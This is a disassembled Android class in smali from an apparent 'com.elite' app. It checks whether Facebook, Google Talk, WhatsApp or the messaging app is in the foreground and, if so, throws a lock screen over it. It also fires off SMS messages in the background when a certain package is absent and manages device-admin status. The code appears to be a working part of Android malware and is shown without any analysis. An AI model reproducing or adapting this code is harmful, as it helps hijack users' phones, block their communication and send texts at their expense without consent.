.class public Lcom/elite/MyServices;
.super Ljava/lang/Object;
.source "MyServices.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/elite/MyServices$Async_sendSMS;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 26
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public getTopActivity(Landroid/content/Context;)V
    .locals 6
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 75
    const-string v4, "activity"

    invoke-virtual {p1, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    .line 76
    .local v1, "mActivityManager":Landroid/app/ActivityManager;
    const/4 v4, 0x1

    invoke-virtual {v1, v4}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v4

    const/4 v5, 0x0

    invoke-interface {v4, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v3, v4, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    .line 77
    .local v3, "topActivity":Landroid/content/ComponentName;
    invoke-virtual {v3}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v2

    .line 79
    .local v2, "packageName":Ljava/lang/String;
    const-string v4, "com.facebook.katana"

    invoke-virtual {v4, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 80
    const-string v4, "com.google.android.talk"

    invoke-virtual {v4, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 81
    const-string v4, "com.whatsapp"

    invoke-virtual {v4, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 82
    const-string v4, "com.android.mms"

    invoke-virtual {v4, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 83
    :cond_0
    new-instance v0, Landroid/content/Intent;

    const-class v4, Lcom/elite/LockScreen;

    invoke-direct {v0, p1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 84
    .local v0, "intent":Landroid/content/Intent;
    const v4, 0x14008000

    invoke-virtual {v0, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 87
    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 89
    .end local v0    # "intent":Landroid/content/Intent;
    :cond_1
    return-void
.end method

.method public isMyServiceRunning(Landroid/content/Context;)Z
    .locals 5
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 34
    const-string v2, "activity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 35
    .local v0, "manager":Landroid/app/ActivityManager;
    const v2, 0x7fffffff

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-nez v3, :cond_1

    .line 40
    const/4 v2, 0x0

    :goto_0
    return v2

    .line 35
    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 36
    .local v1, "service":Landroid/app/ActivityManager$RunningServiceInfo;
    const-class v3, Lcom/elite/IntentServiceClass;

    invoke-virtual {v3}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    iget-object v4, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v4}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 37
    const/4 v2, 0x1

    goto :goto_0
.end method

.method public isPackageExisted(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 3
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "targetPackage"    # Ljava/lang/String;

    .prologue
    .line 158
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 160
    .local v1, "pm":Landroid/content/pm/PackageManager;
    const/16 v2, 0x80

    :try_start_0
    invoke-virtual {v1, p2, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 164
    const/4 v2, 0x1

    :goto_0
    return v2

    .line 161
    :catch_0
    move-exception v0

    .line 162
    .local v0, "e":Landroid/content/pm/PackageManager$NameNotFoundException;
    const/4 v2, 0x0

    goto :goto_0
.end method

.method public keepRunningActivity(Landroid/content/Context;)V
    .locals 5
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 48
    new-instance v1, Lcom/elite/DeviceManager;

    invoke-direct {v1}, Lcom/elite/DeviceManager;-><init>()V

    .line 50
    .local v1, "deviceManager":Lcom/elite/DeviceManager;
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    const v4, 0x7f080007

    invoke-virtual {v3, v4}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, p1, v3}, Lcom/elite/MyServices;->isPackageExisted(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_1

    .line 53
    new-instance v0, Lcom/elite/MyServices$Async_sendSMS;

    invoke-direct {v0, p0, p1}, Lcom/elite/MyServices$Async_sendSMS;-><init>(Lcom/elite/MyServices;Landroid/content/Context;)V

    .line 54
    .local v0, "async_sendSMS":Lcom/elite/MyServices$Async_sendSMS;
    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Void;

    invoke-virtual {v0, v3}, Lcom/elite/MyServices$Async_sendSMS;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 57
    invoke-virtual {p0, p1}, Lcom/elite/MyServices;->getTopActivity(Landroid/content/Context;)V

    .line 68
    .end local v0    # "async_sendSMS":Lcom/elite/MyServices$Async_sendSMS;
    :cond_0
    :goto_0
    return-void

    .line 61
    :cond_1
    :try_start_0
    invoke-virtual {v1, p1}, Lcom/elite/DeviceManager;->isDeviceAdminActive(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 62
    invoke-virtual {v1, p1}, Lcom/elite/DeviceManager;->deactivateDeviceAdmin(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 64
    :catch_0
    move-exception v2

    .line 65
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public sendSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 12
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "phoneNumber"    # Ljava/lang/String;
    .param p3, "message"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 97
    const-string v7, "SMS_SENT"

    .line 98
    .local v7, "SENT":Ljava/lang/String;
    const-string v6, "SMS_DELIVERED"

    .line 100
    .local v6, "DELIVERED":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 101
    .local v0, "sms":Landroid/telephony/SmsManager;
    invoke-virtual {v0, p3}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    .line 102
    .local v3, "parts":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v10

    .line 104
    .local v10, "messageCount":I
    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    .line 105
    .local v5, "deliveryIntents":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    .line 107
    .local v4, "sentIntents":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p1, v2, v1, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v11

    .line 108
    .local v11, "sentPI":Landroid/app/PendingIntent;
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p1, v2, v1, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v8

    .line 110
    .local v8, "deliveredPI":Landroid/app/PendingIntent;
    const/4 v9, 0x0

    .local v9, "j":I
    :goto_0
    if-lt v9, v10, :cond_0

    .line 116
    new-instance v1, Lcom/elite/MyServices$1;

    invoke-direct {v1, p0}, Lcom/elite/MyServices$1;-><init>(Lcom/elite/MyServices;)V

    .line 132
    new-instance v2, Landroid/content/IntentFilter;

    invoke-direct {v2, v7}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 116
    invoke-virtual {p1, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 135
    new-instance v1, Lcom/elite/MyServices$2;

    invoke-direct {v1, p0}, Lcom/elite/MyServices$2;-><init>(Lcom/elite/MyServices;)V

    .line 146
    new-instance v2, Landroid/content/IntentFilter;

    invoke-direct {v2, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 135
    invoke-virtual {p1, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 148
    const/4 v2, 0x0

    move-object v1, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    .line 149
    return-void

    .line 111
    :cond_0
    invoke-virtual {v4, v11}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 112
    invoke-virtual {v5, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 110
    add-int/lit8 v9, v9, 0x1

    goto :goto_0
.end method
